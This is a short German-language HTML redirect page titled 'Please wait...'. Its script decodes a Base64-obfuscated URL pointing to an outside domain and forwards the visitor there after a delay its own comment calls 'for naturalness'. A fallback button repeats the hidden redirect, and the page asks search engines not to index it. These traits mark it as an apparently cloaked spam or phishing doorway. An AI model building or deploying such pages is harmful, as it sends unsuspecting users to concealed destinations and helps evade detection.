<!DOCTYPE html>
<html lang="de">
  <head>
    <meta charset="UTF-8">
    <title>Bitte warten...</title>
    <meta name="robots" content="noindex, nofollow">
    <script>
      // Verschlüsselte URL in Base64
      const encoded = "aHR0cDovL2x1bWVvaG9tZS5vbmxpbmU=";
      // Entschlüsselung und Weiterleitung
      setTimeout(() => {
        const url = atob(encoded);
        window.location.href = url;
      }, 500); // kleine Verzögerung für Natürlichkeit
    </script>
    <style>
      body {
        font-family: sans-serif;
        text-align: center;
        padding-top: 50px;
        background-color: #f9f9f9;
        color: #444;
      }
    </style>
  </head>
  <body>
    <h1>Bitte warten...</h1>
    <p>Du wirst weitergeleitet. Wenn nichts passiert, klicke auf den Button unten:</p>
    <button onclick="window.location.href=atob('aHR0cDovL2x1bWVvaG9tZS5vbmxpbmU=')">
      Manuell weitergehen
    </button>
  </body>
</html>
